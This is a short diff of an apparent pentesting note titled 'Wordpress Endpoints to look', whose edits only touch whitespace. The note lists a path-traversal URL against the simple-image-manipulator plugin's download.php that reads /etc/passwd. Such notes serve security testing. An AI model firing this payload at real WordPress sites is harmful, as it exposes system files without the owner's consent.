@@ -3,10 +3,10 @@ created: 2024-11-18T21:31
 updated: 2025-01-16T05:47
 ---
 # Wordpress Endpoints to look
+
 Wordpress Endpoints to look -
 
-check this if you have these plugin. 
-
+check this if you have these plugin.
 
 ```
 /wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd
